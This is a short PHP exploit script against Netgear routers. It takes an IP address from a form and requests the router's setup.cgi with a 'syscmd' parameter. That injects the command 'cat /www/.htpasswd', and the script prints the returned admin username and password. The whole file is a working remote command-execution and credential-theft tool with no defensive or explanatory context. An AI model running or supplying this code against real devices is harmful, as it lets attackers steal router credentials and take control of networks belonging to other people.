<?php

if (isset($_POST['submit'])){


$ip = $_REQUEST['ip'];


//set POST variables 
$url = 'http://'.$ip.'/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=cat+/www/.htpasswd&curpath=/&currentsetting.htm=1'; 
 //open connection 
$ch = curl_init(); 
//set the url, number of POST vars, POST data 
curl_setopt($ch,CURLOPT_URL, $url); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
//execute post 
$result = curl_exec($ch); 
//close connection 
curl_close($ch); 
echo ('<br><br><br><center><font color="red">The Router is Vulnerable!!!:<br>
Admin username and password is:</font><h2>'.$result.'</h2></center></font>'); 
?>
<?php
}?>